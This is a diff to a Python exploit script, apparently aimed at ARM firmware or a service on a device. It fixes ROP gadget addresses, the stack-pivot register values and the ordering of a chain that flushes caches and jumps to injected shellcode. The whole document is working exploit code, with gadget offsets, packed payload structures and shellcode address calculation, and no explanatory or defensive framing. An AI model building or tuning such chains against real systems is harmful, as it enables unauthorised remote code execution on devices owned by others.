@@ -12,9 +12,9 @@ pop_r0_r1_r2_r3_r7_pc = base + 0x46be8|1
 pop_pc = base + 0x018b0|1
 
 #   244b2:       4798            blx     r3; movs    r0, #0 ;pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x2c5c4|1
+blx_r3_pop_r3 = base + 0x249d2|1
 
-cache_func = base + 0x2353c|1
+cache_func = base + 0x2353c
 
 test = base + 0x177 # prints "Error, the pointer of pidme_data is NULL."
 
@@ -71,11 +71,10 @@ def main():
     body += struct.pack("<II", 36, 30)  # offset to func ptr, offset to arg - set up to point right below
     body += struct.pack("<II", pivot, inject_addr + len(body) + 8)  # func ptr, func arg - right after this pack(), points at the end of ldm package
     # pivot args
-    body += struct.pack("<IIIIII", 0, 0, 0, 0, inject_addr + len(body) + 4 * 6, pop_pc)  # r4, r8, sl, fp, sp, pc
+    body += struct.pack("<IIIIII", 0, 0, 0, 0, inject_addr + len(body) + 4 * 6, pop_r0_r1_r2_r3_r7_pc)  # r4, r8, sl, fp, sp, pc
     # rop chain
     # clean dcache, flush icache, then jump to payload
     chain = [
-        0xDEAD,
         -1,             # r0
         0x1000,         # r1
         0xDEAD,         # r2
@@ -83,11 +82,13 @@ def main():
         0xDEAD,         # r7
         blx_r3_pop_r3,
         0xDEAD,
-        -1
+        -1,
+        0xDEAD,
     ]
+    
     shellcode_addr = inject_addr + len(body) + len(chain) * 4
     print("shellcode base = 0x{:X}".format(shellcode_addr))
-    chain[1] = chain[-1] = shellcode_addr
+    chain[0] = chain[-2] = shellcode_addr
     chain_bin = b"".join([struct.pack("<I", word) for word in chain])
     body += chain_bin
 
